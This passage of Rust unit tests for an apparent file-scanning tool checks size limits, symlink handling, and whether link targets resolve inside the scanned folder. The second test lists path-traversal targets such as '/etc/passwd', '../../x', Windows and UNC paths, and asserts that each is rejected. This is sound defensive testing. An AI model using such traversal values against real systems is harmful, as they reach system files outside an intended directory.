        fn seen(ctx: &Ctx<'_>) -> Vec<Hit> {
            vec![Hit {
                line: 1,
                span: None,
                severity: ctx.base,
                reason: format!("bytes={} issue={:?}", ctx.bytes().len(), ctx.issue),
            }]
        }
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "small.txt", b"0123456789");
        write(dir.path(), "big.txt", &[b'x'; 2000]);
        write(dir.path(), "big.pth", &[b'#'; 2000]);
        write(dir.path(), "huge.txt", &[b'y'; 5000]);
        #[cfg(unix)]
        std::os::unix::fs::symlink("small.txt", dir.path().join("link")).unwrap();
        let rules = [head_rule(seen), file_rule("**/*.pth", probe)];
        let limits = Limits {
            max_buffered_size: 1024,
            max_file_size: 4096,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        let head: Vec<_> = report
            .findings
            .iter()
            .filter(|f| f.rule_id == "test.head")
            .map(|f| (to_slash(&f.file), f.explanation.clone()))
            .collect();
        let mut expected = vec![
            ("big.pth".to_string(), "bytes=2000 issue=None".to_string()),
            ("big.txt".to_string(), "bytes=2000 issue=None".to_string()),
            (
                "huge.txt".to_string(),
                "bytes=5000 issue=Some(TooLarge { size: 5000 })".to_string(),
            ),
            ("small.txt".to_string(), "bytes=10 issue=None".to_string()),
        ];
        if cfg!(unix) {
            expected.insert(
                3,
                (
                    "link".to_string(),
                    "bytes=10 issue=Some(Symlink { target: Some(\"small.txt\"), resolved: \
                     Some(\"small.txt\") })"
                        .to_string(),
                ),
            );
        }
        assert_eq!(head, expected);
        // Only the files over the limit, and the streamed file that a file
        // rule selects, are listed as too large; the head rule adds nothing.
        let too_large: Vec<_> = report
            .skipped
            .iter()
            .filter(|s| matches!(s.reason, SkipReason::TooLarge { .. }))
            .map(|s| to_slash(&s.path))
            .collect();
        assert_eq!(too_large, ["huge.txt", "big.pth"]);
    }

    #[test]
    fn link_targets_are_resolved_as_text_the_way_either_system_reads_them() {
        let inside = |link, target| resolve_link_text(link, target);
        assert_eq!(inside("a/link", "b.txt").as_deref(), Some("a/b.txt"));
        assert_eq!(inside("a/link", "../b.txt").as_deref(), Some("b.txt"));
        assert_eq!(inside("a/link", "./c/../b").as_deref(), Some("a/b"));
        // Inside both ways; the path returned is the one for this system.
        let expected = if cfg!(windows) {
            "b.txt"
        } else {
            "a/..\\b.txt"
        };
        assert_eq!(inside("a/link", "..\\b.txt").as_deref(), Some(expected));
        assert_eq!(inside("link", ".").as_deref(), Some(""));
        for outside in [
            "../../x",
            "/etc/passwd",
            "\\Windows",
            "C:\\Windows",
            "c:relative",
            "\\\\host.invalid\\share",
            "\\\\?\\C:\\x",
            "\\??\\C:\\x",
            "..\\..\\x",
        ] {
            assert_eq!(inside("a/link", outside), None, "{outside}");
        }
        assert_eq!(inside("link", ".."), None);
        // A Unix folder can be named `a\b\c`: read with `/` only, this climbs
        // out three levels, so it is outside whatever the other reading says.
        assert_eq!(inside("l2", "a\\b\\c/../../../etc/hostname"), None);
    }
}
